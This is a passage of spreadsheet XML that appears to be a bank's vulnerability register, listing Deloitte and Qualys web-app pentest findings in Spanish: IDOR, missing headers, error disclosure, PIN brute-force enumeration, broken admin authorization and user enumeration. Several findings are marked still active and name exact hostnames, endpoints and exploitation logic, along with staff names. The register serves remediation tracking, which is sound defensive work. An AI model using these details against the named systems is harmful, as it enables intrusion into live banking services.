    <m/>
    <m/>
    <d v="2025-10-29T00:00:00"/>
    <m/>
    <d v="2025-11-08T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Las &quot;Referencias Inseguras a Objetos de manera Directa&quot; (IDOR) se producen cuando una aplicación proporciona acceso directo a los objetos en función de la entrada proporcionada por el usuario (Normalmente un identificador de objeto, independientemente de su predictibilidad).Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto._x000a_Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para recuperar un objeto sin realizar suficientes comprobaciones de autorización."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo_x000a_directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto,en este caso, el CDT, con el qué el atacante puede obtener la información del mismo. Dichos recursos_x000a_pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el_x000a_sistema o cualquier tipo de información a la que no debería tener acceso de manera previa,_x000a_comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su_x000a_modificación"/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para_x000a_acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene_x000a_privilegios de acceso a la información consultada._x000a_Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie_x000a_a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el_x000a_usuario antes de su envío al servidor"/>
    <m/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="531"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Prospera"/>
    <s v="MAN-69037d9fda6d35412ab5bdd6"/>
    <m/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-30T00:00:00"/>
    <n v="236"/>
    <d v="2026-01-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los recursos JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la carga de scripts en la página.   DETALLE   SC-25-CNMPO-016-CO-001:   Se ha detectado que el servidor web no incluye la cabecera &quot;Content Security Policy&quot; en las respuestas HTTP del servidor.   La siguiente captura de pantalla muestra las cabeceras HTTP que el servidor manda en su respuesta. Como se puede observar, la cabecera &quot;Content Security Policy&quot; no se encuentra entre las cabeceras devueltas:      Ilustración 2. Petición      Ilustración 3. Respuesta del servidor sin la cabecera Content Security Policy       RIESGO   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s v="  RECOMENDACIÓN   Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web.   Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla).   Un ejemplo de configuración de cabecera es el siguiente:   • Content-Security-Policy: default-src 'self' *.trusted.com   Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo:   • &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt;   Para obtener una referencia completa acerca de todas las directivas &quot;Content Security Policy&quot; se recomienda visitar los siguientes enlaces:   • https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP   • https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"/>
    <m/>
    <m/>
    <m/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="532"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-68f7769f4f1323618c186917"/>
    <m/>
    <x v="117"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co:443"/>
    <m/>
    <m/>
    <d v="2025-10-30T00:00:00"/>
    <n v="236"/>
    <d v="2026-01-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   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   DETALLE   SC-25-CNMPO-013-AP-001-001:   Durante la revisión se ha detectado que es posible provocar que la aplicación web muestre detalles internos de la aplicación.   Para provocar el fallo se debe autenticar y visitar la siguiente url.   URL afectada:   - https://confirming-factoring.santander.com.co/factoring/common/mainPages/login.seam?url=       Esto provoca un error interno en la aplicación, lo que resulta con un mensaje de error interno del servidor con detalle de la aplicación tal y como se puede ver en las siguientes evidencias:   - Evidencia 1: Stack trace      - Evidencia 2: Component tree      - Evidencia 3: Scoped Variables   RIESGO   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
    <s v="  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
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="533"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="QA-WAS-526095c8-0dc8-4c60-8e80-e3e2c8488bf0"/>
    <m/>
    <x v="177"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="http://teal.cdt.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-11-21T00:00:00"/>
    <m/>
    <d v="2025-12-21T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="A link is accessible over an insecure connection, i.e. HTTP."/>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m/>
    <m/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="534"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Información"/>
    <s v="QA-WAS-d628db14-458f-4c7d-a615-17d082a821d2"/>
    <m/>
    <x v="212"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/common/squidGuard.conf"/>
    <m/>
    <m/>
    <d v="2025-11-15T00:00:00"/>
    <m/>
    <d v="2026-02-13T00:00:00"/>
    <x v="2"/>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m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="535"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-692970300018985eafc64abb"/>
    <s v="SCBD-25-CNMPO-010-AP-001"/>
    <x v="142"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2025-11-27T00:00:00"/>
    <n v="208"/>
    <d v="2025-12-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="En este caso particular un usuario puede acceder a información del convenio de otros usuarios  modificando el valor de tipo UUID del parámetro GuidConv en el endpoint _x000a_https://recidam.olimpiait.com/ConsultarConvenio."/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para _x000a_acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene _x000a_privilegios de acceso a la información consultada."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo _x000a_directamente modificando el valor de un parámetro utilizado para apuntar directamente a un _x000a_objeto. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros _x000a_usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de _x000a_manera previa."/>
    <s v="sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="536"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-692973e60018985eafc64b29"/>
    <s v="SCBD-25-CNMPO-010-CO-002"/>
    <x v="5"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="recidhub.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2025-12-01T00:00:00"/>
    <n v="204"/>
    <d v="2026-03-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor  revelan información interna acerca del tipo de servidor y versión del mismo así como información  de la infraestructura interna de la aplicación a través de la dirección URL  https://recidhub.olimpiait.com/api/DisciplinaryHistory/GetPublicIp"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de servidor _x000a_y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las cabeceras de _x000a_respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información."/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a _x000a_un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como _x000a_generar ataques más elaborados contra la plataforma."/>
    <s v="sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="537"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Olimpia"/>
    <s v="MAN-692971de0018985eafc64aee"/>
    <s v="SCBD-25-CNMPO-010-CO-003"/>
    <x v="154"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="recidaw.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2025-12-01T00:00:00"/>
    <n v="204"/>
    <d v="2026-03-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación auditada divulga información acerca de una dirección IP interna utilizada, a través del _x000a_cuerpo de la propia respuesta HTTP, al acceder a la dirección URL _x000a_https://recidaw.olimpiait.com/Validación/GetIp"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento _x000a_interno del servidor, como puede ser direccionamiento IP de la red interna en la que está ubicado _x000a_el mismo."/>
    <s v="Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento IP del _x000a_sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red interna."/>
    <s v="sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="538"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="ESG"/>
    <s v="MAN-6942d86e4867435d64ccb596"/>
    <s v="SCBD-25-CNMPO-011-AP-001"/>
    <x v="213"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="http://181.57.221.233/esg/vinculation-form?email_token=&lt;token&gt;"/>
    <m/>
    <m/>
    <d v="2025-12-22T00:00:00"/>
    <n v="183"/>
    <d v="2026-03-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación auditada envía información el token de sesión para realizar el _x000a_formulario a través de la URL: _x000a_http://181.57.221.233/esg/vinculation-form?email_token=&lt;token&gt;"/>
    <s v="Un atacante con acceso al historial del navegador de un usuario legítimo de la aplicación podría _x000a_obtener el token de autorización transmitido en la propia dirección URL, el cual queda almacenado _x000a_en dicho historial. Esto permitiría al atacante utilizar el token para acceder al formulario o completar _x000a_acciones en nombre del usuario, siempre que el token no haya sido consumido previamente._x000a_De la misma manera, un atacante con acceso a los registros de servidores intermedios (como _x000a_proxies, balanceadores o sistemas de monitorización) podría acceder al token, ya que las URLs _x000a_suelen ser registradas de forma íntegra durante el procesamiento de las peticiones."/>
    <s v="Se recomienda no transmitir nunca tokens de autenticación o autorización a través de la URL, _x000a_evitando el uso de parámetros GET para este fin._x000a_Como medida principal, se recomienda que el formulario se valide mediante un Bearer Token _x000a_temporal, enviado exclusivamente en la cabecera Authorization y gestionado por el backend, de _x000a_forma que el token no sea expuesto en la dirección URL ni almacenado en historiales o logs._x000a_De manera complementaria, se recomienda que la información sensible y los mecanismos de _x000a_autorización se mantengan asociados a la sesión del usuario en el servidor, haciendo referencia alos mismos únicamente mediante identificadores no sensibles. Asimismo, se recomienda limitar la _x000a_validez de estos tokens en el tiempo, invalidarlos tras su primer uso y asociarlos al contexto del _x000a_cliente para prevenir ataques de reutilización."/>
    <s v="sin definir"/>
    <m/>
    <s v="Julio Beltran"/>
  </r>
  <r>
    <n v="539"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="ESG"/>
    <m/>
    <s v="SCBD-25-CNMPO-011-AP-002"/>
    <x v="214"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="http://181.57.221.233/"/>
    <m/>
    <m/>
    <d v="2025-12-22T00:00:00"/>
    <n v="183"/>
    <d v="2026-03-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la evaluación de seguridad, se encontró que múltiples encabezados de seguridad HTTP  estaban ausentes en las respuestas del servidor. La ausencia de estos encabezados debilita la  postura de seguridad general de la aplicación al no implementar protecciones clave en el navegador._x000a_Estos encabezados ayudan a restringir las interacciones entre orígenes, mitigar el clickjacking, hacer  cumplir políticas de aislamiento, limitar la filtración de información y proteger contra ataques web  comunes."/>
    <s v="La ausencia de encabezados de seguridad reduce el nivel de endurecimiento del lado del cliente que _x000a_proporciona el navegador. Como resultado, los atacantes pueden aprovechar políticas de origen _x000a_cruzado relajadas, incrustar la aplicación en iframes maliciosos, explotar funciones permitidas del _x000a_navegador o filtrar información sensible a través de metadatos de referencia._x000a_La ausencia de Content-Security-Policy, Cross-Origin-Opener-Policy y Cross-Origin-Embedder-Policy _x000a_significa que la aplicación no puede beneficiarse de las medidas modernas de aislamiento de sitios, _x000a_lo que podría exponerla a filtraciones entre sitios o ataques de incrustación."/>
    <s v="Se recomienda implementar los encabezados de seguridad HTTP más importantes que faltan para _x000a_fortalecer las protecciones del navegador de la aplicación y reducir la exposición a ataques web _x000a_comunes. Los siguientes encabezados deben configurarse con políticas restrictivas:_x000a_• COEP, COOP, CORP para hacer cumplir el aislamiento entre orígenes._x000a_• Content-Security-Policy (CSP) para controlar las fuentes permitidas de scripts, estilos y otros _x000a_recursos._x000a_• Permissions-Policy para restringir el acceso a funciones avanzadas del navegador._x000a_Clear-Site-Data para la limpieza segura de sesiones cuando sea necesario. _x000a_• X-Frame-Options para evitar que la página se incruste en iframes y mitigar el clickjacking. _x000a_Implementar estos encabezados reducirá la superficie de ataque, mitigará riesgos como el _x000a_clickjacking, la exposición de datos y el uso indebido entre orígenes, y mejorará la postura general _x000a_de seguridad de la aplicación."/>
    <s v="sin definir"/>
    <m/>
    <s v="Julio Beltran"/>
  </r>
  <r>
    <n v="540"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Invoway"/>
    <s v="MAN-6957badd4867435d64d9eea0"/>
    <s v="SCBD-25-CNMPO-012-AP-001"/>
    <x v="215"/>
    <m/>
    <s v="Active"/>
    <x v="0"/>
    <n v="9.1"/>
    <m/>
    <m/>
    <s v="https://uat.invoway.com/action/verificarClaveCliente"/>
    <m/>
    <m/>
    <d v="2025-12-29T00:00:00"/>
    <n v="176"/>
    <d v="2026-01-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas de seguridad se identificó una vulnerabilidad lógica en los mecanismos de autenticación y autorización que permite a un usuario previamente autenticado enumerar los PIN asociados a otras cuentas conociendo únicamente su dirección de correo electrónico. La aplicación no valida correctamente la vinculación entre el contexto de la sesión autenticada y el usuario objetivo sobre el que se realiza la verificación del PIN, lo que posibilita realizar múltiples intentos de validación sin controles efectivos de limitación, bloqueo o detección de abuso. Como consecuencia, un atacante puede identificar PINs válidos y, una vez obtenidos, impersonar a otros _x000a_usuarios, accediendo de forma no autorizada a sus cuentas y funcionalidades asociadas, lo que evidencia un fallo de lógica de autenticación y control de acceso, y no un error de inyección u origen técnico clásico."/>
    <s v="Se recomienda implementar las siguientes medidas de seguridad de forma urgente: (1) Validar en _x000a_el servidor, de manera aleatoria e independiente del cliente, qué posiciones del PIN deben ser _x000a_verificadas en cada intento de autenticación, almacenando esta información en la sesión del _x000a_servidor y nunca confiando en los parámetros enviados por el cliente. (2) Implementar una _x000a_validación robusta del identificador de usuario en el backend, asegurando que coincida con el _x000a_usuario autenticado en la sesión actual e impidiendo que se pueda modificar el código de usuario _x000a_durante el flujo de validación del PIN. (3) Establecer controles de límite de intentos fallidos por _x000a_cuenta y por dirección IP, bloqueando temporalmente el acceso tras un número reducido de _x000a_intentos incorrectos. (4) Implementar monitorización y alertas en tiempo real para detectar _x000a_patrones anómalos de validación de PIN, como múltiples intentos desde la misma sesión o IP. (5) _x000a_Considerar la adopción de mecanismos de autenticación multifactor más robustos, como OTP _x000a_basados en tiempo o autenticación biométrica, para complementar o reemplazar el sistema actual _x000a_de PIN."/>
    <s v="La combinación de estas dos vulnerabilidades representa un riesgo crítico para la seguridad de la _x000a_aplicación, ya que permite a un atacante comprometer cualquier cuenta de usuario mediante un _x000a_ataque de fuerza bruta altamente eficiente. Al poder manipular las posiciones del PIN que son _x000a_validadas por el servidor y realizar suplantación de identidad modificando el código de usuario en _x000a_las peticiones, un atacante únicamente necesita probar un máximo de 100 combinaciones (en lugar _x000a_de las 999.999 teóricas de un PIN de 6 dígitos) para obtener acceso no autorizado. Este escenario _x000a_expone información confidencial, permite realizar operaciones fraudulentas en nombre de _x000a_usuarios legítimos y compromete la integridad de todo el sistema. La facilidad de explotación y el _x000a_bajo número de intentos requeridos hace que estas vulnerabilidades sean especialmente _x000a_peligrosas, ya que pueden evadir mecanismos tradicionales de detección de fuerza bruta basados _x000a_en umbrales de intentos fallidos, y no requieren conocimiento previo de las credenciales de la _x000a_víctima."/>
    <s v="sin definir"/>
    <m/>
    <s v="Leidy Godoy"/>
  </r>
  <r>
    <n v="541"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Invoway"/>
    <s v="MAN-6957bb0d4867435d64d9eea1"/>
    <s v="SCBD-25-CNMPO-012-AP-002_x000d_"/>
    <x v="216"/>
    <m/>
    <s v="Active"/>
    <x v="4"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="https://uat.invoway.com/action/generarCredencialesCliente"/>
    <m/>
    <m/>
    <d v="2025-12-29T00:00:00"/>
    <n v="176"/>
    <d v="2026-01-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas se identificó una debilidad en el mecanismo de bloqueo de cuentas que permite realizar múltiples intentos de autenticación fallidos sin que se active un bloqueo efectivo ni medidas de mitigación adecuadas. La ausencia o incorrecta implementación de controles como contadores de intentos, bloqueos temporales o retrasos progresivos facilita ataques de fuerza bruta y enumeración de credenciales, incrementando significativamente el riesgo de acceso no _x000a_autorizado a cuentas de usuario."/>
    <s v="Se recomienda revisar y modificar la lógica de la funcionalidad de recuperación de contraseña con _x000a_el objetivo de evitar que pueda ser utilizada como un mecanismo de bloqueo de cuentas por parte _x000a_de usuarios maliciosos. En particular, la aplicación no debería permitir que acciones iniciadas _x000a_únicamente a partir del conocimiento de una dirección de correo electrónico deriven en el bloqueo _x000a_de una cuenta. Es aconsejable implementar controles adicionales como limitación de intentos por _x000a_origen, mecanismos de detección de abuso, validaciones progresivas (por ejemplo, CAPTCHA o desafíos adaptativos) y flujos de recuperación que no alteren el estado de la cuenta hasta que el _x000a_usuario legítimo complete satisfactoriamente el proceso de verificación. Estas medidas reducirán _x000a_el riesgo de denegación de servicio a nivel de usuario y minimizarán la necesidad de intervención _x000a_manual por parte del personal de soporte."/>
    <s v="Esta situación permite que un actor malicioso abuse de la propia lógica de la aplicación para _x000a_provocar el bloqueo de una o varias cuentas de usuario de forma reiterada. Mediante la _x000a_automatización de solicitudes legítimas desde el punto de vista funcional, un atacante podría forzar _x000a_estados de bloqueo persistentes sin necesidad de explotar una vulnerabilidad técnica compleja. _x000a_Como consecuencia, las cuentas afectadas quedarían inoperativas hasta que se realice una _x000a_intervención manual por parte del personal responsable, generando un escenario de denegación _x000a_de servicio a nivel de usuario, impacto operativo sobre los procesos de negocio y una carga _x000a_adicional para los equipos de soporte o administración."/>
    <s v="sin definir"/>
    <m/>
    <s v="Leidy Godoy"/>
  </r>
  <r>
    <n v="542"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Invoway"/>
    <s v="MAN-6957bb564867435d64d9eea2"/>
    <m/>
    <x v="217"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="6.6"/>
    <m/>
    <m/>
    <s v="https://uat.invoway.com"/>
    <m/>
    <m/>
    <d v="2026-01-02T00:00:00"/>
    <n v="172"/>
    <d v="2026-04-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   El acceso no autorizado a información restringida ocurre cuando individuos o sistemas obtienen acceso a datos confidenciales o clasificados sin contar con los permisos legítimos para ello. Esta vulnerabilidad se materializa mediante diversos métodos como la explotación de fallos de seguridad en aplicaciones, el robo o compromiso de credenciales, técnicas de ingeniería social, o el abuso de privilegios por parte de usuarios internos. Como resultado, información sensible como datos personales, secretos comerciales, propiedad intelectual o registros financieros queda expuesta a actores no autorizados, generando riesgos significativos que incluyen pérdidas económicas, sanciones regulatorias, daño reputacional y potencial ventaja para competidores o actores malintencionados.   DETALLE   A continuación se muestran las pantallas que visualiza un usuario con privilegios elevados de forma legítima, así como las peticiones HTTP realizadas y las respuestas emitidas por parte del servidor:          Figura 18 - Como el usuario javilasumariva que tiene privilegios elevados es posible identificar el panel de Administración      Figura 19 - El usuario javila accediendo legítimamente a la lista de proveedores          Figura 20 - El cuerpo json de la petición realizada como administrador de la aplicación al solicitar el listado de proveedores      Figura 21 - Fragmento de la respuesta del servidor tras la petición legitima con el usuario javilasumariva   A continuación se replicará esta misma petición utilizando otro usuario en cuyo panel de opciones la funcionalidad de administrador no se encuentra disponible:      Figura 22 - El usuario ggonzalez no tiene acceso al panel de administración   A continuación se muestra la información de la sesión del usuario ggonzalez en el navegador.      Figura 23 - Cookie de sesión del usuario ggonzalez   A continuación como el usuario ggonzalez se intercepta cualquier petición al endpoint /action/router, se puede observar que la cookie de sesión se pasa en la cabecera “Authorization”.      Figura 24 - Usando la cookie del usuario ggonzalez se replica la petición para listar los proveedores (sólo disponible desde el panel de administración)      Figura 25 - Petición con respuesta por parte del servidor   Con esto un usuario está accediendo a información que debería estar sólo autorizado a usuarios con privilegios elevados.   RIESGO   El acceso no autorizado a información restringida conlleva riesgos técnicos significativos para la organización. Un atacante puede no solo visualizar datos confidenciales como credenciales, configuraciones de sistemas o información sensible de usuarios, sino también modificar o eliminar registros críticos, comprometiendo la integridad de las bases de datos. Este acceso inicial puede servir como vector para escalar privilegios dentro del sistema, permitiendo al atacante moverse lateralmente por la infraestructura, comprometer otros servicios conectados, instalar puertas traseras para mantener persistencia, o exfiltrar grandes volúmenes de información sin ser detectado. La combinación de estos factores puede resultar en un compromiso total del entorno, pérdida de control sobre sistemas críticos y exposición masiva de activos de información."/>
    <s v="  RECOMENDACIÓN   Implementar los mecanismos de autorización necesarios para garantizar que cada usuario únicamente pueda acceder a los recursos y funcionalidades correspondientes a su rol y nivel de privilegios asignado. Estos controles deben validarse tanto en el lado del cliente como, especialmente, en el servidor, asegurando que todas las peticiones sean verificadas antes de conceder acceso a información o funcionalidades restringidas. Se recomienda adoptar el principio de mínimo privilegio, realizar auditorías periódicas de permisos, implementar sistemas de control de acceso basado en roles (RBAC), y registrar todos los intentos de acceso para facilitar la detección de actividades anómalas o no autorizadas."/>
    <m/>
    <s v="sin definir"/>
    <m/>
    <s v="Leidy Godoy"/>
  </r>
  <r>
    <n v="543"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Invoway"/>
    <s v="MAN-6957bb9d4867435d64d9eea3"/>
    <m/>
    <x v="216"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://uat.invoway.com"/>
    <m/>
    <m/>
    <d v="2026-01-02T00:00:00"/>
    <n v="172"/>
    <d v="2026-04-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   La enumeración de usuarios es una vulnerabilidad que permite a un atacante identificar qué cuentas existen en el sistema mediante la funcionalidad de recuperación de contraseña. El sistema revela la existencia o inexistencia de usuarios a través de mensajes diferenciados como &quot;Se ha enviado un correo de recuperación&quot; frente a &quot;El usuario no existe&quot;, permitiendo al atacante confirmar qué cuentas son válidas sin necesidad de credenciales. Esta información facilita ataques posteriores más efectivos como fuerza bruta, credential stuffing o campañas de phishing dirigido, ya que el atacante puede concentrar sus esfuerzos únicamente en cuentas confirmadas.   DETALLE   SCBD-25-CNMPO-012-AP-004:   Se ha identificado en la funcionalidad de recuperación de contraseña una vulnerabilidad que permite la enumeración de usuarios válidos registrados en el sistema. A continuación se muestran las evidencias de susodicha falla.      Figura 26 - Acceso a la funcionalidad para recuperar la contraseña del usuario      Figura 27 - La aplicación solicita el código de usuario, es la dirección de correo del usuario del que se quiere restablecer la contraseña          Figura 28 - Petición inteceptada tras introducir la dirección de e-mail y enviar la petición   Estas credenciales son actualizadas automáticamente sin interacción del usuario legítimo. Esto se ha plasmado en la vulnerabilidad de denegación de servicio explicada en este mismo informe.   Por otra parte en la respuesta del servidor es posible identificar cuando la dirección de correo introducida exista en la aplicación o por otra parte no existe.       En caso de usar un e-mail no existente en la aplicación:      Figura 29 - Petición enviando un mail no existente en la aplicación genera un error      Figura 30 - En la respuesta del servidor el mensaje de error explícito &quot;No existe el usuario indicado&quot;       RIESGO   La enumeración de usuarios constituye un riesgo significativo al proporcionar al atacante información valiosa sobre las cuentas existentes en el sistema. Con esta información, un adversario puede optimizar ataques de fuerza bruta concentrándose exclusivamente en usuarios confirmados, aumentando la probabilidad de éxito y reduciendo la detección al evitar intentos sobre cuentas inexistentes. Adicionalmente, las listas de usuarios válidos pueden emplearse para lanzar campañas de phishing dirigido más creíbles, ataques de credential stuffing utilizando credenciales filtradas de otras plataformas, o realizar ingeniería social personalizada. Esta vulnerabilidad reduce sustancialmente las barreras de entrada para comprometer cuentas legítimas y facilita la fase de reconocimiento en ataques más complejos."/>
    <s v="  RECOMENDACIÓN   Implementar mensajes de respuesta genéricos e idénticos en la funcionalidad de recuperación de contraseña, independientemente de si el usuario existe o no en el sistema. El mensaje debe ser ambiguo, como &quot;Si el correo electrónico está registrado, recibirás instrucciones para recuperar tu contraseña&quot;, evitando revelar la existencia de cuentas específicas.   Normalizar los tiempos de respuesta del sistema para que sean consistentes tanto para usuarios válidos como inválidos, previniendo ataques de análisis de temporización que puedan inferir la existencia de cuentas mediante diferencias en los tiempos de procesamiento."/>
    <m/>
    <s v="sin definir"/>
    <m/>
    <s v="Leidy Godoy"/>
  </r>
  <r>
    <n v="544"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Invoway"/>
    <s v="MAN-6957bbe84867435d64d9eea4"/>
    <m/>
    <x v="218"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <d v="2026-01-02T00:00:00"/>
    <n v="172"/>
    <d v="2026-04-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   Esta vulnerabilidad ocurre cuando una aplicación revela información sensible sobre su infraestructura técnica (nombres de software, versiones específicas, rutas del sistema, configuraciones internas) a través de mensajes de error que no han sido controlados o sanitizados adecuadamente.   DETALLE   Se han identificado varios endpoints que generan un error en servidor y esta es devuelta en la respuesta del mismo. A través de esto es posible identificar las tecnologías implicadas incluso la versión del servidor web usado.   SCBD-25-CNMPO-012-AP-005-001:   En la funcionalidad de la aplicación para restablecer una contraseña olvidada es posible generar un error donde la versión del servidor web es exfiltrada. A continuación se muestra el flujo seguido para reproducir el error:   1. Accede a la funcionalidad para restablecer la contraseña.      Figura 31 - Funcionalidad para restablecer contraseña y PIN      Figura 32 - Se introduce un código de usuario (dirección de e-mail)   A continuación se muestra la petición interceptada y cómo es una respuesta legítima:      Figura 33 - Respuesta legítima del servidor   En caso de usar un e-mail no existente en la aplicación esto genera un error en la misma que exfiltra la versión del servidor web. A continuación se muestran las evidencias:      Figura 34 - Al utilizar una dirección de e-mail no existente en la aplicación esta devuelve un código 500, Internal Server Error   En la misma petición al bajar en la respuesta del servidor es posible identificar que la versión de Apache Tomcat es la 9.0.109.      Figura 35 - Versión de Apache Tomcat exfiltrada   El 